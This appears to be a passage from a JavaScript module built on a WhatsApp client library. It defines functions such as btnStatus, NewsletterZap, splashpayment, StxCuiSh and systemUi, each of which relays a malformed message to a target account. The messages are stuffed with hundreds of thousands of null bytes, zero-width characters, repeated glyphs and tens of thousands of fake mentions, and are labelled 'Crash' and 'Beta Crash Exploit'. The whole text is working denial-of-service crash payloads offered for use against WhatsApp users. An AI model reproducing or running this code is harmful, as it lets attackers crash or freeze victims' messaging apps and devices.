                    body: { text: "惡조로Nted Crash Gen6🐉버그" + "ꦿ".repeat(45000) },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            buttons: Array(3).fill({
                                name: "cta_url",
                                buttonParamsJson: "\u200b".repeat(250)
                            })
                        })
                    },
                    header: { title: "惡조로Nted Crash Gen6🐉버그", hasMediaAttachment: false }
                }
            },
            messageContextInfo: {
                deviceListMetadata: {
                    senderKeyHash: crypto.randomBytes(16),
                    senderTimestamp: 999999999,
                    recipientKeyHash: crypto.randomBytes(16)
                },
                quotedMessage: {
                    buttonsMessage: {
                        contentText: "🚨 WhatsApp Beta Crash",
                        footerText: "Generated by RizxVelz",
                        buttons: [{
                            buttonId: "\u0000".repeat(250),
                            buttonText: { displayText: "𖤐 Crash Now 𖤐" },
                            type: 1
                        }],
                        headerType: 1
                    }
                },
                mentionedJid: [jid],
                externalAdReply: {
                    title: "Beta Crash Exploit",
                    mediaType: 1,
                    body: "ViewOnce + NativeButton + Quoted Combo",
                    sourceUrl: "https://whatsapp.com",
                    thumbnail: Buffer.from([1, 2, 3]) // fake buffer
                }
            }
        }
    };

    await sock.relayMessage(jid, payload, {
        messageId: crypto.randomBytes(10).toString("hex"),
        additionalNodes: [
            { tag: "meta", attrs: { dev: "Extorditcv" }, content: [] }
        ]
    });
}


async function btnStatus(sock, jid, mention) {
let msg = await generateWAMessageFromContent(jid, {
buttonsMessage: {
text: "🔥",
contentText: "༿༑ᜳᢶ⃟",
footerText: "☠️",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0000".repeat(500000) }, type: 1 }
],
headerType: 1
}
}, {});

await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [jid],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: jid }, content: undefined }] }] }
]
});

if (mention) {
await sock.relayMessage(jid, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: msg.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "⚡ - 𝗦𝗡𝗶𝗧𝗖𝗛 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" }, content: undefined }
]
});
}
}

async function NewsletterZap(sock, jid) {
var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
'viewOnceMessage': {
'message': {
"newsletterAdminInviteMessage": {
"newsletterJid": `120363298524333143@newsletter`,
"newsletterName": "Script Goku" + "@1".repeat(60000) + "\u0000".repeat(920000),
"jpegThumbnail": "",
"caption": `Script sur notre chaîne WhatsApp`,
"inviteExpiration": Date.now() + 1814400000
}
}
}
}), {
'userJid': jid
});
await sock.relayMessage(jid, messageContent.message, {
'participant': {
'jid': jid
},
'messageId': messageContent.key.id
});
}

async function splashpayment(sock, jid) {
let virtex = `조로Nted Crash Gen6🐉버그\n ${vir1}${"ꦾ".repeat(103000)}`;
let apiClient = JSON.stringify({
status: true,
criador: "Nted WhatsApp API",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
sock.relayMessage(jid, {
interactiveMessage: {
contextInfo: {
stanzaId: jid,
participant: jid,
mentionedJid: [ jid, m.chat, "13135550002@s.whatsapp.net" ],
forwardingScore: 9117,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363330344810280@newsletter",
serverMessageId: null,
newsletterName: "ٯ".repeat(100)
},
externalAdReply: {
showAdAttribution: true,
title: `조로Nted Crash Gen6🐉버그`,
body: `${"\u0000".repeat(9117)}`,
mediaType: 1,
renderLargerThumbnail: true,
thumbnailUrl: null,
sourceUrl: ""
},
businessMessageForwardInfo: {
businessOwnerJid: jid,
},
dataSharingContext: {
showMmDisclosure: true,
},
quotedMessage: {
paymentInviteMessage: {
serviceType: 1,
expiryTimestamp: null
}
},
disappearingMode: {
initiator: "CHANGED_IN_CHAT",
trigger: "CHAT_SETTING"
}
},
body: { text: `${virtex}` },
footer: { text: " " },
nativeFlowMessage: {
messageParamsJson: `{\"name\":\"galaxy_message\",\"title\":\"${"\u200D".repeat(9117)}\",\"header\":\"${"\u200D".repeat(9117)}\",\"body\":\"${"\u200D".repeat(9117)}\"}`,
buttons: [
{
name: "single_select",
buttonParamsJson: apiClient + "\u0000".repeat(9117),
},
{
name: "single_select", buttonParamsJson: JSON.stringify({ status: true, criador: "Nted WhatsApp API", versao: "@latest", atualizado: "2025-04-15", suporte: "https://wa.me/13135550002", comandosDisponiveis: [`pp`], prefixo: `pler`, linguagem: "id" }) + "\u0003"
},
{
name: "single_select",
buttonParamsJson: apiClient + "\u0000".repeat(9117),
},
{
name: "single_select",
buttonParamsJson: apiClient + "\u0000".repeat(9117),
},
{
name: "call_permission_request",
buttonParamsJson: apiClient + "\u200D".repeat(9117), voice_call: "call_crash"
}, 
{
name: "call_permission_request",
buttonParamsJson: apiClient + "\u200D".repeat(9117),
}, 
{
name: "call_permission_request",
buttonParamsJson: apiClient + "\u200D".repeat(9117),
},
{
name: "cta_url",
buttonParamsJson: apiClient + "\u0003".repeat(9117),
},
{
name: "payment_method",
buttonParamsJson: apiClient + "\u0003".repeat(9117),
},
{
name: "payment_status",
buttonParamsJson: apiClient + "\u0003".repeat(9117),
},
{
name: "review_order",
buttonParamsJson: apiClient + "\u0003".repeat(9117),
},
],
},
inviteLinkGroupTypeV2: "DEFAULT"
}
}, {
participant: {
jid: jid
}
}, {
messageId: null
});
};



async function xatanicaldelayv2(sock, jid, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
                
async function CursorimgDoc(sock, jid) {
const buttons = [
{ buttonId: "\u0000".repeat(299999), buttonText: { displayText: "Haii?" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
{
buttonId: "\u0000", 
buttonText: { displayText: '조로Nted Crash Gen6🐉버그' }, 
type: 1, 
nativeFlowInfo: { 
name: '조로Nted Crash Gen6🐉버그',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(220000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 2 
}
}
];
let messagePayload = {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"caption": "조로Nted Crash Gen6🐉버그" + "\u0000".repeat(199) + "ꦾ".repeat(15999), 
"fileSha256": "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
"fileLength": "99999999999",
"height": 307,
"width": 734,
"mediaKey": "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
"fileEncSha256": "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
"directPath": "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1738686532",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
"scansSidecar": "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
"scanLengths": [
2226,
6362,
4102,
6420
],
"midQualityFileSha256": "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA=", 
contextInfo: {
virtexId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: [jid, "0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "조로Nted Crash Gen6🐉버그",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
caption: "조로Nted Crash Gen6🐉버그"
},
hasMediaAttachment: true,
contentText: "조로Nted Crash Gen6🐉버그",
footerText: "Why?",
buttons: buttons, 
viewOnce: true,
headerType: 3
}
}, 
isForwarded: true,
actionLink: {
url: "t.me/joomodz",
buttonTitle: "조로Nted Crash Gen6🐉버그"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363409362506610@newsletter",
serverMessageId: 1,
newsletterName: `조로Nted Crash Gen6🐉버그${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
}
}
}
}
}
};
await sock.relayMessage(jid, messagePayload, {
messageId: sock.generateMessageTag(), 
participant: { jid : jid }
});
}

async function protocol5(sock, jid, mention) {
    const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 50000)}@s.whatsapp.net`
    )
  ];


    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "SNiTCH" + "ោꦾ៝".repeat(100000),
        title: "snitch⸙ꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ✦⸙ꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: jid }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function StxCuiSh(sock, jid) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "조로Nted Crash Gen6🐉버그",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "조로Nted Crash Gen6🐉버그"
                    },
                },
              },
            body: {
              text: "조로Nted Crash Gen6🐉버그" + "ꦾ".repeat(2500000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(jid, message, {
      participant: { jid: jid },
    });
  }
  
async function systemUi(sock, jid) {
    await sock.relayMessage(jid, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "ꦾ".repeat(300000) + "@1".repeat(70000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: ["1@newsletter"],
                        groupMentions: [{
                            groupJid: "1@newsletter",
                            groupSubject: "RxhL"
                        }],
                        quotedMessage: {
                            documentMessage: {
                                contactVcard: true
                            }
                        }
                    }
                }
            }
        }
    }, {
        participant: {
            jid: jid
        }
    }, {
        messageId: null
    });
}
// Tambahkan SEMUA FUNGSI LAIN seperti di atas:
// - callNewsletter
// - crashNewsletter
// - VcardXFc
// - XdelayTrash
// - LocaBetanew2
// - BetaUI
// - CrashXUiKiller
// - InVisiOneMess
// - XProto3V2
// - crashUiV5
// - VampDelayCrash
// - frezui
// - CrashPayloadNew
// - btnStatus
// - NewsletterZap
// - splashpayment
// - xatanicaldelayv2
// - CursorimgDoc

// ===========================

module.exports = {
  InVisibleX,
  IMGCRL,
  potterinvis,
  callNewsletter,
  crashNewsletter,
  VcardXFc,
  XdelayTrash,
  LocaBetanew2,
  BetaUI,
  CrashXUiKiller,
  InVisiOneMess,
  XProto3V2,
  crashUiV5,
  VampDelayCrash,
  frezui,
  CrashPayloadNew,
  btnStatus,
  NewsletterZap,
  splashpayment,
  xatanicaldelayv2,
  CursorimgDoc
};

